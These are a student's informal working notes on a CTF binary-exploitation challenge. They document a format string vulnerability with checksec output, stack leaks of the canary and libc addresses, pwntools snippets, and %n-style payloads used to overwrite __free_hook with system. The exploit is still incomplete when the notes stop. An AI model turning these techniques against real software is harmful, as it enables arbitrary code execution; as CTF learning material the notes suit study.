# first thing first

we check the security of the program 
```
┌──(kali㉿kali)-[~/Desktop/CTF/enrollment]
└─$ checksec program                                                                  
[*] '/home/kali/Desktop/CTF/enrollment/program'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

- no GOT hijacking 
- need to potentially bypass canary if it is a overflow problem 
- no shellcode injection 
- need to leak addresses of a specific area and calculate the offset etc. to be able to tranverse between addresses

most probably ret2libc 

next + system combo to get the shell 

# format string vulnerability 

```c
case 4:
    printf("Email: %s\n",email);
    printf("Reason for late enrollment:\n");
    printf(reasonBuf);  // Direct format string vulnerability here
```

But the thing is, reasonBuf is on heap, not on stack 


## to do :
1. control reasonBuf, probably with %p
2. look at the stack / heap very carefully, if you spot something suspicious, interesting. Mark it down and gpt / look deeper 
3. target to leak canary, return address, a libc function addresses i.e. 
4. target to overwrite return address and start ROP chain 
5. second loop overwrite with ret to libc, just like 7a probably


## dicoveries

```c
printf("Email: %s\n",email); 
```

we can input addresses of email here to leak content 


```
Reason for late enrollment:
0x7f91c8b9e643 
(nil) 
0x7f91c8aba210 
0x73 
0xffffffff 
0x400000050 
0x557ddd5132a0 
0x796d6d7564 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
(nil) 
0x7ffc1c88d110 
0x9cf5cec9cfd41700 // canary %19$p
0x7ffc1c88d110 
0x557db1cf359e // main+108 %21$p
0x1 
0x7f91c89dfd68 // __libc_start_call_main+120 GOT_leak %23$p
0x7ffc1c88d210 
0x557db1cf3532 // main %25$p
0x1b1cf2040 
0x7ffc1c88d228 
0x7ffc1c88d228 
0x74dab26899accbb2 
(nil) 
0x7ffc1c88d238 
0x7f91c8c01000
```

our prime candidates:
```c
free(reasonBuf);
```


```
Why __free_hook?
“… modify the behavior of free(3) by specifying appropriate hook
functions.” __free_hook(3) - Linux man page

Similar to GOT hijacking, but still works in Full ReLRO!


Can be thought of as GOT entry for the free function that is
always writable.
Only works for glibc < 2.34


e.got["<some libc function>"]
ELF("libc.so.6").sym["__free_hook"]
```


# to do:

- leak more libc addresses, the common ones, to calculate libc version 
- explore more to discover more and see if libc entries are somewhere on stack
- specifically:
  - elf.got[entry] to leak libc version with %s arbirary read
  - calculate libc base, system, __free_hook
  - use fmtstr_payload to overwrite __free_hook with system
  - go into the function and get shell


# seems like it is because of heap 
- try examining memory of heap with different arguments 
- try directly using %s (treating %s as 1st argument) to see if it works

```
pwndbg> x/32gx 0x55a9d9a0e2a0
0x55a9d9a0e2a0: 0x4141732541414141      0x000055a9c599ff90
0x55a9d9a0e2b0: 0x0000000a20700000      0x0000000000000000
0x55a9d9a0e2c0: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e2d0: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e2e0: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e2f0: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e300: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e310: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e320: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e330: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e340: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e350: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e360: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e370: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e380: 0x0000000000000000      0x0000000000000000
0x55a9d9a0e390: 0x0000000000000000      0x0000000000000000
pwndbg> x/gx 0x000055a9c599ff90
0x55a9c599ff90 <puts@got.plt>:  0x00007f162e693760
```


it is indeed inside heap and can be derefencesd (via pwndbg)
but idk how to automate the process in python (first deference heap with %s,. then go inside and dereference 0x55a9c599ff90, how can this in done in python)


first dereference heap, then dereference the second argument inside the heap
actually i think i do not need the 'A's, because the arguments i put would be the first, scond entry on heap 

fuck my hand fucking hurts


```
p.sendlineafter(b"late enrollment:", b'AAAAAAAA'+p64(puts_entry)+b'-%7$p-%8$p-%9$p')
```

just realized that there's also the email function which i can use to directly leak content lul 



# many ways does not work 

then I guess now it's time to inspect pwndbg in details

for example i am quite interested in how exactly does it look right after readInput email (specifically and during printf)

also what happens if we overflow the stack location that stores the heap lol variable lol 


hmm.. do I need to add crackets for mutiple layer derefernecing lol 



# reason why email don't work 

```
0x56195fb7349a <enrollment_simulator+222>    mov    rsi, rax                        RSI => 0x7ffc3caec870 —▸ 0x56195fc142a0 —▸ 0x56195fb75f90 (puts@got[plt]) —▸ 0x7f0c829ea760 (puts) ◂—
```

it is just dereferencing a stack location that stores email lol `0x7ffc3caec870`


hmmm or can email and late enrolment work together?

OH WAIT

```
01:0008│-068 0x7ffded270a48 —▸ 0x55dcd66aa2a0 ◂— '%8$pAAAABBBBBBBB'
02:0010│-060 0x7ffded270a50 ◂— 0x796d6d7564 /* 'dummy' */
```

`%8$p` is actually reading the email input

what if...email is an address and we do `%8$s` !!!
OMG!

it worked on local but not on remote (before getting libc version) remote different libc so the location of return address is different on stack (at %27$p differen from `%25$p` from buffer)
(didn't expect this because)

old code first part
```
#gdb.attach(p, s)

# First interaction - input email and reason
p.sendlineafter(b"What would you like to do?", b'1')
p.sendlineafter(b"ITSC email:", b'dummy')
p.sendlineafter(b"late enrollment:", b"%7$p \n%19$p \n%23$p \n%25$p \n")

# Second interaction - view the info
p.sendlineafter(b"What would you like to do?", b'4')
p.recvuntil(b"Reason for late enrollment:\n")
heap = int(p.readline().strip(), 16)
canary = int(p.readline().strip(), 16)
libc_start = int(p.readline().strip(), 16)
main_addr = int(p.readline().strip(), 16)
```

# Overwriting __free_hook to system 

## automated payload 
doesn't seem to work?
```
00:0000│ rsp 0x7ffe32db8f30 ◂— 0x100000050 /* 'P' */
01:0008│-068 0x7ffe32db8f38 —▸ 0x558f2945f2a0 ◂— '%8$sAAAA'
02:0010│ rsi 0x7ffe32db8f40 ◂— 0x3631256334343125 ('%144c%16')
03:0018│-058 0x7ffe32db8f48 ◂— 0x633238256e6c6c24 ('$lln%82c')
04:0020│-050 0x7ffe32db8f50 ◂— 0x256e686824373125 ('%17$hhn%')
05:0028│-048 0x7ffe32db8f58 ◂— 0x3831256337323832 ('2827c%18')
06:0030│-040 0x7ffe32db8f60 ◂— 0x25633035256e6824 ('$hn%50c%')
07:0038│-038 0x7ffe32db8f68 ◂— 0x39256e6868243931 ('19$hhn%9')
```

```
0x7f39d0b47e48
0x7f39d09ab290
```
above is __free_hook 
below is _system 

I am planning to manually overwriting them lol 
by putting format specifier (those specifying a bunch of arguments) to printf 
and addresses on email 

(would that even work)


 I am guessing that 
1. we have to write manually
2. reasonBuf holds the format specifiers
3. email or other locations on the stack above where buffer starts holds the addresses to be overwritten



1. write manually, byte by byte, most importantly find a way to inspect the memory while doing that so that you know exactly what you are doing (actually kinda hard since I may not be able to inspect libc functions)
2. but you can write 1 byte than print the leaked function out lol


To be someone who would get number1, finishes all pwn challenges

you basically need to be better than everyone right now, even the authors

so you basically need to know and jot down so many things related to pwn, memorise and get familiar with them with flashcards and more exercises

the strong people are:
they are curious
they are interested
they are enthusiasts 
they take rest
they are energetic when they have to 
they can relaxed 
they can control themselves 
they know what they are thinking

you will be one of them


man i want to finish the challenge and send a message to 650 about it, and only that, not to the firebird server

target before sleep:

able to automating overwrite of one byte of __free_hook, able to observe the change in gdb 

and then you go to bed 


```py
# 0x7f1ca5c6de48, 0x7fbfea69ae48
# 0x7f1ca5ad1290, 0x7fbfea4fe290
```

I need to overwrite in total of 6 bytes 
```py
c6de48, 69ae48
ad1290, 4fe290
```

- think of somme yes or no, or simple confirmation questions to ask gpt / 650 

```
00:0000│ rsp 0x7ffd7e7e4530 ◂— 0x400000050 /* 'P' */
01:0008│-068 0x7ffd7e7e4538 —▸ 0x55e44b9822a0 ◂— '%144c%8$hhn'
02:0010│-060 0x7ffd7e7e4540 —▸ 0x7f1c3d7cae48 (__free_hook) ◂— 0x90
03:0018│-058 0x7ffd7e7e4548 ◂— 0
```

`02:0010│-060 0x7ffd7e7e4540 —▸ 0x7f1c3d7cae48 (__free_hook) ◂— 0x90` !!!!1

`0x7f1c3d7cae48 <__free_hook>:   0x0000000000000090` but isn't it more like storing 0x90?

yea that's probably just showing that __free_hook is storing the bytes, not being written 

```
pwndbg> search -8 0x7f4c608b2e48
Searching for an 8-byte integer: b'H.\x8b`L\x7f\x00\x00'
libc            0x7f4c608afef8 0x7f4c608b2e48 (__free_hook)
[stack]         0x7fffb93de400 0x7f4c608b2e48 (__free_hook)
[stack]         0x7fffb93e1580 0x7f4c608b2e48 (__free_hook)
```

I am now trying to find where __free_hook is stored, seems like it's libc `0x7f4c608afef8` ?


```
RSP  0x7ffe83e15388 —▸ 0x560aefc764e5 (enrollment_simulator+297) ◂— mov edi, 1
*RIP  0x90
───────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────
Invalid address 0x90

```




tyooooooooooooooo!

it's going there! 

It' FUCKING GOING THERE!!!


```
pwndbg> x/gx 0x7fa0ee652e48
0x7fa0ee652e48 <__free_hook>:   0x0000000000008690
```

let's go!!!!!!!!!! dude!!!!!!   








```
01:0008│-068 0x7ffc8295a3b8 —▸ 0x55a4677262a0 ◂— '%127c%8$hhn'
02:0010│-060 0x7ffc8295a3c0 —▸ 0x7f2ad1fe5e4d (__free_hook+5) ◂— 0x7f

```


omggggggggg why
